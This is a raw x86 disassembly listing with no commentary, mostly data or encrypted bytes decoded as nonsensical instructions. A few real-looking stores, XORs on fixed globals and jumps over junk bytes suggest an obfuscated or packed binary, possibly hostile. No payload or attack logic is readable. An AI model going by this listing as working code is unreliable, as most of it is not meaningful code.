  41313b:	cdq    
  41313c:	xor    BYTE PTR [edx+eiz*8-0x11],bh
  413140:	sbb    BYTE PTR [edi+0x2a],0x71
  413144:	out    dx,al
  413145:	retf   0x1f79
  413148:	mov    DWORD PTR [ebp-0x28],esi
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fcf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e128,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	int    0x66
  413180:	lods   eax,DWORD PTR ds:[esi]
  413181:	dec    esi
  413182:	mov    ds:0xb9707061,eax
  413187:	jle    0x4131f9
  413189:	jo     0x4131d9
  41318b:	inc    ebx
  41318c:	aas    
  41318d:	shr    DWORD PTR [ebp+0x5307a20],1
  413193:	pop    es
  413194:	mov    dh,0xc9
  413196:	cmp    BYTE PTR [ecx+0x312f197e],bh
  41319c:	inc    ebp
  41319d:	jg     0x4131a7
  41319f:	sbb    eax,0xed51ede5
  4131a4:	add    al,BYTE PTR [esi]
  4131a6:	ins    BYTE PTR es:[edi],dx
  4131a7:	lahf   
  4131a8:	ins    BYTE PTR es:[edi],dx
  4131a9:	dec    ecx
  4131aa:	retf   0x8268
  4131ad:	sbb    eax,0x6f3f75c6
  4131b2:	and    al,0xd
  4131b4:	loopne 0x413174
  4131b6:	xor    BYTE PTR ds:0xe53a52ce,bl
  4131bc:	ror    DWORD PTR [esi-0x58],cl
  4131bf:	inc    esp
  4131c0:	aad    0xc3
  4131c2:	gs popf 
  4131c4:	mov    BYTE PTR [edi-0x5d5f0117],cl
  4131ca:	jle    0x413249
  4131cc:	cmp    BYTE PTR [ebp-0x33a1c909],bh
  4131d2:	sti    
  4131d3:	pop    edx
  4131d4:	adc    al,BYTE PTR [esi]
  4131d6:	out    0xab,al
  4131d8:	dec    eax
  4131d9:	bound  edi,QWORD PTR [edx-0x5317a566]
  4131df:	in     al,dx
  4131e0:	lea    esp,[eax+0x27d16426]
  4131e6:	push   cs
  4131e7:	push   edx
  4131e8:	bound  esi,QWORD PTR [ebx*1+0x6891ffa6]
  4131ef:	mov    dl,0xa7
  4131f1:	(bad)  
  4131f3:	aam    0x94
  4131f5:	mov    ecx,0xbf4beb9c
  4131fa:	call   0x3e618a2f
  4131ff:	pop    edx
  413200:	pushf  
  413201:	sub    BYTE PTR [edx-0x6],bh
  413204:	cwde   
  413205:	dec    ebp
  413206:	cdq    
  413207:	mov    dh,0x7c
  413209:	jge    0x413231
  41320b:	mov    es:0xb49cee7c,eax
  413211:	repz cdq 
  413213:	dec    ebp
  413214:	add    DWORD PTR [edi+0x707c54d],eax
  41321a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41321b:	stc    
  41321c:	lods   eax,DWORD PTR ds:[esi]
  41321d:	out    0xf7,al
  41321f:	stos   BYTE PTR es:[edi],al
  413220:	cld    
  413221:	push   es
  413222:	gs sbb al,0xab
  413225:	cmc    
  413226:	pop    es
  413227:	pop    eax
  413228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413229:	push   ebx
  41322a:	sbb    edi,DWORD PTR [esi+0x6f]
  41322d:	xchg   edx,eax
  41322e:	add    ebp,ecx
  413230:	xor    al,0x1e
  413233:	bound  edx,QWORD PTR ds:0xcacbebeb
  413239:	jmp    0xef83:0x43543da1
  413240:	jbe    0x413236
  413242:	mov    ch,0x53
  413244:	jne    0x4131d8
  413246:	add    DWORD PTR [ecx-0x5c1e3401],0x213f1d08
  413250:	xlat   BYTE PTR ds:[ebx]
  413251:	push   cs
  413252:	sar    BYTE PTR [ecx-0x7b28b1c9],1
  413258:	out    dx,al
  413259:	dec    ebp
  41325a:	xchg   edi,eax
  41325b:	pop    edi
  41325c:	or     bl,BYTE PTR [esi-0x6b63b9cf]
  413262:	scas   eax,DWORD PTR es:[edi]
  413263:	jle    0x413245
  413265:	out    0xf3,eax
  413267:	pop    esi
  413268:	jle    0x4132e8
  41326a:	fnstsw WORD PTR [edx+0x3e903eb6]
  413270:	scas   eax,DWORD PTR es:[edi]
  413271:	push   edi
  413272:	int    0xc8
  413274:	sbb    bh,BYTE PTR [eax-0x137a5657]
  41327a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41327b:	scas   eax,DWORD PTR es:[edi]
  41327c:	sbb    al,0x79
  41327e:	push   es
  41327f:	sub    ecx,DWORD PTR ds:0xab27ddd7
  413285:	cmp    ah,BYTE PTR [edi+ebp*8+0x7d]
  413289:	iret   
  41328a:	dec    edx
  41328b:	pop    esp
  41328c:	test   DWORD PTR [ecx+0x3],edx
  41328f:	adc    DWORD PTR [ecx-0x7543e3e0],ebx
  413295:	std    
  413296:	in     al,dx
  413297:	or     al,0x3f
  413299:	sbb    eax,0x1f0f12f1
  41329e:	mov    ds:0xb15af7e6,al
  4132a3:	mov    dl,0xcd
  4132a5:	test   eax,0x475a5a91
  4132aa:	neg    bh
  4132ac:	in     eax,0x74
  4132ae:	sti    
  4132af:	adc    eax,0xf6365fc8
  4132b4:	frstor [eax+0x43bce9a3]
  4132ba:	es pop esp
  4132bc:	call   0xf83dac3a
  4132c1:	ret    
  4132c2:	mov    cs:0xa16cb13e,eax
  4132c8:	xchg   ebp,eax
  4132c9:	ficom  WORD PTR [edi]
  4132cb:	bnd jno 0x4157c2b6
  4132d2:	in     eax,dx
  4132d3:	cmp    BYTE PTR [eax-0x2d530843],al
  4132d9:	inc    esp
  4132da:	jno    0x4132dc
  4132dc:	sub    al,0x98
  4132de:	pop    ebp
  4132df:	(bad)  
  4132e0:	push   ds
  4132e1:	xchg   edx,eax
  4132e2:	sbb    al,0x6d
  4132e4:	cmp    eax,DWORD PTR ds:0x5fb4e408
  4132ea:	(bad)  
  4132eb:	jmp    0x41330f
  4132ed:	pop    edi
  4132ee:	jns    0x413280
  4132f0:	pop    ds
  4132f1:	cmp    al,dh
  4132f3:	pop    edi
  4132f4:	repnz lods eax,DWORD PTR ds:[esi]
  4132f6:	mov    dh,0x53
  4132f8:	sar    DWORD PTR [esi+0x58b749cf],1
  4132fe:	call   0x508f6db7
  413303:	scas   al,BYTE PTR es:[edi]
  413304:	mov    eax,DWORD PTR [esi]
  413306:	shl    BYTE PTR [ebx-0xb],cl
  413309:	fiadd  WORD PTR [edi-0x473cc105]
  41330f:	pusha  
  413310:	cmp    al,0xa5
  413312:	aaa    
  413313:	dec    eax
  413314:	cmp    eax,0xcdf9e929
  413319:	jecxz  0x413354
  41331b:	sub    dh,dh
  41331d:	test   al,0x31
  41331f:	ds xchg ebp,eax
  413321:	pop    ecx
  413322:	pop    ecx
  413323:	rcl    BYTE PTR [ecx],1
  413325:	adc    BYTE PTR [eax+edi*8+0x2ffe3fea],dl
  41332c:	sahf   
  41332d:	cld    
  41332e:	sub    al,0x8e
  413330:	mov    dl,0xcf
  413332:	out    0x76,al
  413334:	or     BYTE PTR [esi-0x25],dh
  413337:	hlt    
  413338:	or     DWORD PTR [eax],0x2b81c891
  41333e:	sub    DWORD PTR [ebp-0x5a],ebx
  413341:	int3   
  413342:	jecxz  0x4133b3
  413344:	jns    0x413350
  413346:	aad    0xf0
  413348:	jmp    0x41330a
  41334a:	xchg   BYTE PTR [ebx+ecx*2],dh
  41334d:	push   ebx
  41334e:	add    eax,0x2082b9df
  413353:	or     BYTE PTR [eax+0x73],cl
  413356:	dec    edi
  413357:	aaa    
  413358:	push   ecx
  413359:	mov    al,ds:0x5f4e7dad
  41335e:	test   BYTE PTR [esi+eiz*1-0x2],ah
  413362:	dec    edi
  413363:	xchg   ebp,eax
  413364:	in     eax,0x1e
  413366:	dec    eax
  413367:	ret    0xf195
  41336a:	mov    ch,BYTE PTR [eax+0x5356d8e6]
  413370:	addr16 push ss
  413372:	in     al,dx
  413373:	ins    BYTE PTR es:[edi],dx
  413374:	add    esp,edi
  413376:	aam    0x61
  413378:	stos   BYTE PTR es:[edi],al
  413379:	add    eax,esp
  41337b:	inc    ebp
  41337c:	or     esi,ebx
  41337e:	stos   BYTE PTR es:[edi],al
  41337f:	inc    ebp
  413380:	icebp  
  413381:	adc    ecx,DWORD PTR [ecx]
  413383:	out    dx,eax
  413384:	inc    esp
  413385:	adc    al,BYTE PTR [edi]
  413387:	pushf  
  413388:	xchg   esp,eax
  413389:	test   DWORD PTR [edx+0x6d8a0de2],ebx
  41338f:	aas    
  413390:	sbb    eax,0x2dabf0d3
  413395:	push   cs
  413396:	outs   dx,DWORD PTR ds:[esi]
  413397:	jae    0x413368
  413399:	push   DWORD PTR [ebp+0x33765311]
  41339f:	imul   ebx,DWORD PTR [edi*2-0x6aa954eb],0x78
  4133a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133a8:	(bad)  
  4133a9:	xor    DWORD PTR [ecx+ecx*8-0x49],ecx
  4133ad:	mov    edx,0xd436ff81
  4133b2:	pop    edi
  4133b3:	sub    eax,0xdc52bd38
  4133b8:	inc    edx
  4133b9:	inc    ecx
  4133ba:	adc    ebp,ebp
  4133bc:	jns    0x413438
  4133be:	or     esi,ecx
  4133c0:	fsub   DWORD PTR [edx+0x669662f3]
  4133c6:	sbb    eax,0xcbcce288
  4133cb:	clc    
  4133cc:	mov    WORD PTR [edi+ecx*2],ds
  4133cf:	sbb    BYTE PTR ds:0x44be5106,bl
  4133d5:	fild   WORD PTR [ebp-0xe]
  4133d8:	or     al,0x37
  4133da:	adc    BYTE PTR [edx+0x237a1d07],0xec
  4133e1:	(bad)  
  4133e2:	(bad)  
  4133e3:	sub    esp,esp
  4133e5:	dec    ebp
  4133e6:	sbb    DWORD PTR [edi-0x1a],ebx
  4133e9:	or     BYTE PTR [ebx],dh
  4133eb:	xlat   BYTE PTR ds:[ebx]
  4133ec:	retw   0x8580
  4133f0:	sbb    edi,DWORD PTR [eax+0x5]
  4133f3:	mov    edx,0x8017774
  4133f8:	add    bh,BYTE PTR [esi-0x51caf170]
  4133fe:	test   eax,0xdf64779e
  413403:	pop    eax
  413404:	jne    0x4133c6
  413406:	ds pop edx
  413408:	or     esp,DWORD PTR [edx-0x31279f6e]
  41340e:	jnp    0x413401
  413410:	bound  edx,QWORD PTR [esp+eiz*4-0x37522c80]
  413417:	add    esi,DWORD PTR gs:[ebp-0x28]
  41341b:	jmp    FWORD PTR [ebx]
  41341d:	sahf   
  41341e:	adc    DWORD PTR [ebx+0x40ae46f9],edx
  413424:	imul   esi,DWORD PTR [edx-0xf],0xfffffff0
  413428:	dec    esp
  413429:	xchg   edi,eax
  41342a:	or     al,0x99
  41342c:	sub    al,BYTE PTR [ebp-0x73faafcd]
  413432:	(bad)  
  413433:	sub    esp,edx
  413435:	inc    ebx
  413436:	retf   
  413437:	sub    BYTE PTR [esi],ch
  413439:	dec    esp
  41343a:	psubusb mm2,QWORD PTR [ebx+0x48]
  41343e:	clc    
  41343f:	jae    0x413408
  413441:	mov    cl,BYTE PTR [eax]
  413443:	pop    ebp
  413444:	adc    esp,esi
  413446:	or     dl,BYTE PTR [edi]
  413448:	popf   
  413449:	inc    ebp
  41344a:	pop    esi
  41344b:	popa   
  41344c:	jp     0x41344a
  41344e:	adc    dh,BYTE PTR [edx-0x4b]
  413451:	add    ecx,ebx
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fcf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fcd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x5d29b30f,al
  413492:	mov    gs,esp
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x5570707e
  41349c:	mov    dh,0xf6
  41349e:	cmp    esp,ebp
  4134a0:	inc    edx
  4134a1:	mov    edi,0x7acdaeec
  4134a6:	repnz sar BYTE PTR ds:0x650493c1,cl
  4134ad:	sub    BYTE PTR [eax],dh
  4134af:	xor    eax,0xc18c3435
  4134b4:	dec    esi
  4134b5:	imul   eax,DWORD PTR gs:[ebx+0x1899455e],0xffffff8b
  4134bd:	or     eax,0xeca1cbaf
  4134c2:	mov    bl,BYTE PTR [edi*2+0x6becbdb6]
  4134c9:	test   eax,0xaa722401
  4134ce:	aad    0xaf
  4134d0:	jns    0x413485
  4134d2:	cmp    ah,bl
  4134d4:	xchg   esp,eax
  4134d5:	cmp    BYTE PTR [eax],bl
  4134d7:	xor    BYTE PTR [ecx+0x7d],bl
  4134da:	(bad)  
  4134db:	inc    esp
  4134dc:	pop    es
  4134dd:	and    al,0xdf
  4134df:	inc    ecx
  4134e0:	inc    edx
  4134e1:	outs   dx,DWORD PTR ds:[esi]
  4134e2:	and    BYTE PTR [ebp+0x1],dl
  4134e5:	mov    edx,0x5e20663c
  4134ea:	in     al,dx
  4134eb:	xchg   BYTE PTR ds:0x72c8b362,cl
  4134f1:	mov    edi,0x5983c88e
  4134f6:	mov    cs,esp
  4134f8:	stos   BYTE PTR es:[edi],al
  4134f9:	mov    DWORD PTR [eax-0x1c],edx
  4134fc:	pusha  
  4134fd:	xor    DWORD PTR [ebx],ebp
  4134ff:	(bad)  
  413500:	pop    edx
  413501:	mov    ds:0xa275145e,eax
  413506:	cmp    eax,0x102b3931
  41350b:	mov    ah,0x6a
  41350d:	gs push ebx
  41350f:	and    DWORD PTR [ebp-0x4],0x3f
  413513:	(bad)  
  413514:	push   ebx
  413515:	add    DWORD PTR [edx],edi
  413517:	mov    eax,0x6bde2129
  41351c:	adc    DWORD PTR [eax+0x3c],eax
  41351f:	das    
  413520:	pop    eax
  413521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413522:	pusha  
  413523:	add    eax,0x7e0b121e
  413528:	shl    BYTE PTR [edx],0x7
  41352b:	mov    ds:0xb1a6d804,al
  413530:	enter  0xce7c,0xe4
  413534:	jno    0x413574
  413536:	nop
  413537:	(bad)  
  413539:	xor    eax,0xb8b7760d
  41353e:	cmp    edx,DWORD PTR [ecx]
  413540:	shl    cl,1
  413542:	or     BYTE PTR [ecx-0x4d],dh
  413545:	call   0x78f34ba8
  41354a:	mov    DWORD PTR [edi+eax*8+0x5d6d4416],ebx
  413551:	cwde   
  413552:	pushf  
  413553:	(bad)  
  413555:	out    0xa4,eax
  413557:	imul   esi,DWORD PTR [eax-0x39],0x2c5bee6b
  41355e:	sti    
  41355f:	out    dx,al
  413560:	cmp    ecx,DWORD PTR [edx]
  413562:	sbb    ebp,ecx
  413564:	mov    eax,0x51a815f2
  413569:	iret   
  41356a:	std    
  41356b:	loop   0x4135e8
  41356d:	or     eax,0x9407399a
  413572:	bound  eax,QWORD PTR ds:0xb408ebe8
  413578:	push   edi
  413579:	stos   BYTE PTR es:[edi],al
  41357a:	mov    eax,0x672c7a46
  41357f:	outs   dx,DWORD PTR ds:[esi]
  413580:	jmp    0xfb71b76
  413585:	jne    0x4135a1
  413587:	sub    BYTE PTR [ebx-0x536c352a],dl
  41358d:	jl     0x4135cb
  41358f:	lods   eax,DWORD PTR ds:[esi]
  413590:	pop    eax
  413591:	cli    
  413592:	mov    dh,0x77
  413594:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413595:	pop    eax
  413596:	aas    
  413597:	ins    BYTE PTR es:[edi],dx
  413598:	jle    0x413538
  41359a:	or     DWORD PTR [ecx+0x56a41d15],ebp
  4135a0:	in     eax,0x9d
  4135a2:	dec    esi
  4135a3:	and    eax,0x7b83c484
  4135a8:	sbb    eax,0x68ae60b4
  4135ad:	ret    0xbe88
  4135b0:	push   ecx
  4135b1:	ins    DWORD PTR es:[edi],dx
  4135b2:	aaa    
  4135b3:	bound  ebp,QWORD PTR [edi]
  4135b5:	dec    ebx
  4135b6:	std    
  4135b7:	mov    ch,0xa1
  4135b9:	iret   
  4135ba:	bound  ecx,QWORD PTR [edi+0xf]
  4135bd:	in     eax,0x91
  4135bf:	stc    
  4135c0:	in     eax,dx
  4135c1:	leave  
  4135c2:	shl    dl,0xb9
  4135c5:	xor    cl,al
  4135c7:	enter  0xf80b,0xb9
  4135cb:	jge    0x413588
  4135cd:	dec    edi
  4135ce:	lods   eax,DWORD PTR ds:[esi]
  4135cf:	test   DWORD PTR [esi],edi
  4135d1:	pop    ss
  4135d2:	push   0x5e
  4135d4:	loop   0x413590
  4135d6:	push   edi
  4135d7:	fistp  WORD PTR [ecx-0x31]
  4135da:	jo     0x413576
  4135dc:	cmp    DWORD PTR [ebp-0x36],ecx
  4135df:	push   ss
  4135e0:	in     al,dx
  4135e1:	(bad)  
  4135e3:	test   DWORD PTR es:[ecx-0x58],esp
  4135e7:	dec    eax
  4135e8:	mov    ebx,0xcddadfe0
  4135ed:	sbb    BYTE PTR [ecx-0x27b26f60],dl
  4135f3:	into   
  4135f4:	jnp    0x413646
  4135f6:	data16 jae 0x413673
  4135f9:	or     dh,BYTE PTR ds:0xbb22171a
  4135ff:	dec    ebx
  413600:	leave  
  413601:	xchg   esp,eax
  413602:	mov    BYTE PTR [esi+0x36],bl
  413605:	xchg   edi,eax
  413606:	mov    eax,ds:0x4cff5371
  41360b:	mov    ds:0xfe421db2,eax
  413610:	pusha  
  413611:	sub    eax,0x139755b3
  413616:	mov    ds,WORD PTR [edx+0x69]
  413619:	add    DWORD PTR [edx-0x60799af2],ebx
  41361f:	repz pop edx
  413621:	call   0x5147:0x807e580b
  413628:	jecxz  0x4136a0
  41362a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41362b:	jae    0x41360d
  41362d:	popf   
  41362e:	iret   
  41362f:	inc    edi
  413630:	in     eax,dx
  413631:	jae    0x4135d2
  413633:	(bad)  
  413634:	fmul   QWORD PTR [edi]
  413636:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413637:	jle    0x4135c3
  413639:	out    0xc5,al
  41363b:	dec    edx
  41363c:	adc    al,0xe
  41363e:	adc    BYTE PTR ds:0x25cc204d,0x51
  413645:	push   es
  413646:	outs   dx,BYTE PTR ds:[esi]
  413647:	cmp    al,0x7d
  413649:	dec    edi
  41364a:	xlat   BYTE PTR ds:[ebx]
  41364b:	ret    0x5c55
  41364e:	into   
  41364f:	mov    ds:0x4de70b26,al
  413654:	mov    ecx,edx
  413656:	pop    ecx
  413657:	cmc    
  413658:	rcr    BYTE PTR [esi+0x50c7758d],0x45
  41365f:	mov    ecx,0x85fd27aa
  413664:	setbe  BYTE PTR ds:0xb97090cd
  41366b:	stos   DWORD PTR es:[edi],eax
  41366c:	add    ah,ah
  41366e:	or     bl,BYTE PTR [eax+0x79d082b0]
  413674:	stos   DWORD PTR es:[edi],eax
  413675:	(bad)  
  413677:	or     ch,BYTE PTR [ebp+0x16]
  41367a:	xchg   esp,eax
  41367b:	xchg   esp,eax
  41367c:	and    DWORD PTR [esi+0x2d54aef7],eax
  413682:	xchg   esp,eax
  413683:	sub    eax,0x5514193c
  413688:	xor    al,0x31
  41368a:	test   DWORD PTR [esp+ebx*8],esp
  41368d:	adc    DWORD PTR [ecx+eiz*8],eax
  413690:	aam    0x9
  413692:	xor    eax,0x71b598e
  413697:	xchg   DWORD PTR [eax-0x1bfe0fd7],ecx
  41369d:	lds    ebx,FWORD PTR [eax]
  41369f:	cli    
  4136a0:	add    DWORD PTR [ebx+0x6a4afb23],ebx
  4136a6:	sub    bh,BYTE PTR ds:0xc49b8287
  4136ac:	aam    0xb0
  4136ae:	jnp    0x4136dd
  4136b0:	aas    
  4136b1:	loop   0x4136bc
  4136b3:	fnsave [edx+0x507e86e]
  4136b9:	cmp    al,BYTE PTR [esi]
  4136bb:	and    DWORD PTR [ecx+0x17853e46],ebx
  4136c1:	add    al,0xc8
  4136c3:	push   esp
  4136c4:	mov    esi,0xe51ddade
  4136c9:	cdq    
  4136ca:	mov    ch,0x2
  4136cc:	loopne 0x4136ba
  4136ce:	add    bh,ch
  4136d0:	das    
  4136d1:	fcomp  DWORD PTR [eax+0x74]
  4136d4:	sbb    BYTE PTR [edx+0x57],bl
  4136d7:	(bad)  
  4136d8:	pop    edx
  4136d9:	xchg   edx,eax
  4136da:	pushf  
  4136db:	push   DWORD PTR [edi]
  4136dd:	cld    
  4136de:	fwait
  4136df:	jns    0x4136f8
  4136e1:	mov    bh,0x58
  4136e3:	or     ebx,DWORD PTR [eax]
  4136e5:	test   eax,0x5f04dc5f
  4136eb:	stos   DWORD PTR es:[edi],eax
  4136ec:	fcom   QWORD PTR [edi+ebp*4+0x76]
  4136f0:	xchg   ebp,eax
  4136f1:	xchg   ecx,eax
  4136f2:	outs   dx,BYTE PTR ds:[esi]
  4136f3:	dec    DWORD PTR [ebx]
  4136f5:	pop    ebx
  4136f6:	sbb    al,0x43
  4136f8:	adc    DWORD PTR ds:0x2ae962a3,esi
  4136fe:	add    ebp,ecx
  413700:	and    DWORD PTR [eax],0xffffffe4
  413703:	xlat   BYTE PTR ds:[ebx]
  413704:	inc    edx
  413705:	test   DWORD PTR ds:0x8581e270,ebx
  41370b:	and    BYTE PTR [ebp+0x72f87c28],dl
  413711:	add    DWORD PTR [esi],edx
  413713:	fisubr DWORD PTR [ebp-0x37c4392b]
  413719:	push   0xf164a112
  41371e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41371f:	hlt    
  413720:	mov    al,0xc7
  413722:	mov    eax,0xa8b0b5d9
  413727:	push   ecx
  413728:	pop    edx
  413729:	xor    BYTE PTR [ecx-0x4b3eb203],ch
  41372f:	retf   
  413730:	retf   
  413731:	(bad)  
  413732:	pop    edi
  413733:	xor    eax,0x52e499d3
  413738:	mov    esp,0xd06e00bf
  41373d:	dec    ecx
  41373e:	mov    edi,0x78aa945e
  413743:	test   ecx,ebx
  413745:	push   ecx
  413746:	jmp    0x99981d23
  41374b:	mov    al,0xd6
  41374d:	add    eax,0xf2627203
  413752:	rol    BYTE PTR [esi-0x32],cl
  413755:	push   0xea8b339c
  41375a:	cmp    al,0x8c
  41375c:	push   ds
  41375d:	ss push ecx
  41375f:	xchg   esp,eax
  413760:	(bad)  
  413762:	cmp    edi,eax
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	(bad)  
  41377f:	pop    eax
  413780:	add    ebp,DWORD PTR [ebp+0x35]
  413783:	imul   esi,DWORD PTR [eax+0x70],0xffffffb9
  413787:	jle    0x4137f9
  413789:	jo     0x413754
  41378b:	aas    
  41378c:	test   ebx,esp
  41378e:	hlt    
  41378f:	pushf  
  413790:	mov    esi,0x1b2ba93b
  413795:	scas   eax,DWORD PTR es:[edi]
  413796:	xrelease xchg BYTE PTR [esi+0xa47dbc0],ah
  41379d:	rol    DWORD PTR ds:0xcdcc86b8,1
  4137a3:	bound  edi,QWORD PTR [edi+0x79]
  4137a6:	mov    ?,WORD PTR [eax+0xde50a7d]
  4137ac:	mov    ecx,0x363991ef
  4137b1:	xchg   ebx,eax
  4137b2:	mov    ch,0xed
  4137b4:	xchg   esi,eax
  4137b5:	xor    BYTE PTR [esi-0x7a],al
  4137b8:	rcl    DWORD PTR [edx+ebp*1],0x23
  4137bc:	mov    esp,0xd0446b50
  4137c1:	xor    BYTE PTR [ecx-0x6b],0x85
  4137c5:	inc    ebp
  4137c6:	or     ebx,DWORD PTR [ebp-0x3f]
  4137c9:	daa    
  4137ca:	push   ebx
  4137cb:	jge    0x4137f2
  4137cd:	pop    edi
  4137ce:	das    
  4137cf:	mov    cl,0xc4
  4137d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137d2:	pop    edx
  4137d3:	ret    
  4137d4:	imul   edx,DWORD PTR [ebp-0x7f],0x72
  4137d8:	lods   al,BYTE PTR ss:[esi]
  4137da:	dec    esp
  4137db:	adc    eax,0xc8fff4fa
  4137e0:	cmp    BYTE PTR [ebx-0x7f],bh
  4137e3:	daa    
  4137e4:	push   cs
  4137e5:	pop    esi
  4137e6:	pushf  
  4137e7:	sbb    esp,DWORD PTR [edx+0x20c5eb40]
  4137ed:	cmp    al,0xcb
  4137ef:	jg     0x413852
  4137f1:	enter  0x4961,0x7d
  4137f5:	push   ebp
  4137f6:	sete   BYTE PTR [eax+0x7f669d7c]
  4137fd:	pop    ebp
  4137fe:	pop    ss
  4137ff:	push   ss
  413800:	enter  0x5211,0x79
  413804:	rcr    BYTE PTR [esi],1
  413806:	fiadd  WORD PTR [eax+0x3c91c600]
  41380c:	pop    edx
  41380d:	jl     0x41380f
  41380f:	int    0xc6
  413811:	ret    
  413812:	call   0x3740f193
  413817:	sub    al,0xff
  413819:	cwde   
  41381a:	or     al,0xb3
  41381c:	lods   al,BYTE PTR ds:[esi]
  41381d:	inc    ecx
  41381e:	aam    0x84
  413820:	lods   eax,DWORD PTR ds:[esi]
  413821:	jge    0x413809
  413823:	inc    ecx
  413824:	loop   0x413886
  413826:	push   edx
  413827:	mul    BYTE PTR [eax+0x74]
  41382a:	sub    BYTE PTR [ecx+0x25],ah
  41382d:	pop    edx
  41382e:	and    BYTE PTR [ecx+0x6c7178a0],al
  413834:	popf   
  413835:	shl    ebx,0x98
  413838:	sbb    al,0x9
  41383a:	mov    bl,0x16
  41383c:	enter  0x4306,0xc1
  413840:	mov    ch,0xa2
  413842:	test   eax,0x108762f
  413847:	and    al,0x2d
  413849:	xchg   DWORD PTR [ecx],ecx
  41384b:	cs cmp eax,0xa13b1f9
  413851:	sub    ecx,DWORD PTR [edx-0x73]
  413854:	(bad)  
  413855:	mov    al,ds:0x9989d32d
  41385a:	push   eax
  41385b:	pop    eax
  41385c:	mov    edx,0xec44f998
  413861:	jmp    0x332a91e2
  413866:	push   ebx
  413867:	adc    al,0x68
  413869:	(bad)  
  41386a:	retf   0x4448
  41386d:	mov    edi,0x8ad6490f
  413872:	inc    eax
  413873:	test   eax,0x112fcc7
  413878:	mov    esp,0x3caded2a
  41387d:	dec    ebx
  41387e:	dec    edi
  41387f:	rcr    cl,cl
  413881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413882:	js     0x413835
  413884:	pop    edx
  413885:	loopne 0x413812
  413887:	mov    esp,0xc969109b
  41388c:	xchg   BYTE PTR [ebp+0x1fd9f43],dh
  413892:	mov    eax,0xabe6f736
  413897:	mov    bh,0x10
  413899:	(bad)
  41389c:	inc    ebp
  41389d:	jl     0x413821
  41389f:	mov    ecx,0x46cdf7c
  4138a4:	xor    eax,0x2df8955c
  4138a9:	pop    esi
  4138aa:	in     eax,dx
  4138ab:	push   0x3b105183
  4138b0:	loop   0x413909
  4138b2:	dec    ebx
  4138b3:	jne    0x4138fa
  4138b5:	mov    esi,0x26832442
  4138ba:	fbstp  TBYTE PTR [eax]
  4138bc:	stos   BYTE PTR es:[edi],al
  4138bd:	jae    0x413879
  4138bf:	rol    DWORD PTR [eax],cl
  4138c1:	lock imul esp,DWORD PTR [edx-0x42],0xffffff91
  4138c6:	pop    ss
  4138c7:	das    
  4138c8:	test   eax,0x19d24fde
  4138cd:	fidiv  DWORD PTR [eax*4+0x4726acb1]
  4138d4:	scas   eax,DWORD PTR es:[edi]
  4138d5:	jno    0x413917
  4138d7:	imul   ebp,ebx,0xffffffb7
  4138da:	fld    QWORD PTR [esi+0x54]
  4138dd:	loope  0x4138f2
  4138df:	jg     0x413904
  4138e1:	retf   0x228c
  4138e4:	dec    edx
  4138e5:	in     eax,0x9a
  4138e7:	push   es
  4138e8:	push   edx
  4138e9:	jmp    0x93ae:0xa39d87aa
  4138f0:	sbb    DWORD PTR [ecx],ebp
  4138f2:	xor    al,0x2
  4138f5:	int3   
  4138f6:	(bad)  
  4138f7:	xor    esi,DWORD PTR [ebx+0x3b78a70b]
  4138fd:	jp     0x41397c
  4138ff:	loope  0x413907
  413901:	xchg   ebx,eax
  413902:	mov    edx,0x7cd52777
  413907:	scas   eax,DWORD PTR es:[edi]
  413908:	imul   ebp,edi,0x4f
  41390b:	rol    DWORD PTR ds:0x27408040,1
  413911:	retf   0xdd43
  413914:	jle    0x4138d7
  413916:	push   es
  413917:	mov    bh,0xa2
  413919:	fadd   QWORD PTR [eax+0x20578e4]
  41391f:	adc    al,0x58
  413921:	sbb    al,ch
  413923:	pop    ebx
  413924:	xchg   DWORD PTR [ebx-0x5322991b],ecx
  41392a:	lock fst DWORD PTR [edx]
  41392d:	scas   al,BYTE PTR es:[edi]
  41392e:	dec    ebp
  41392f:	test   DWORD PTR [eax],eax
  413931:	sub    bh,bh
  413933:	jo     0x41398a
  413935:	scas   eax,DWORD PTR es:[edi]
  413936:	sbb    cl,BYTE PTR [edi]
  413938:	add    eax,0xa436a06c
  41393d:	pop    eax
  41393e:	sbb    eax,0xb349cea0
  413943:	or     eax,0x90cdd22f
  413948:	mov    dl,cl
  41394a:	jbe    0x413998
  41394c:	mov    ch,0xa
  41394e:	add    DWORD PTR [edi-0x11ce3fcb],ebx
  413954:	jge    0x4138eb
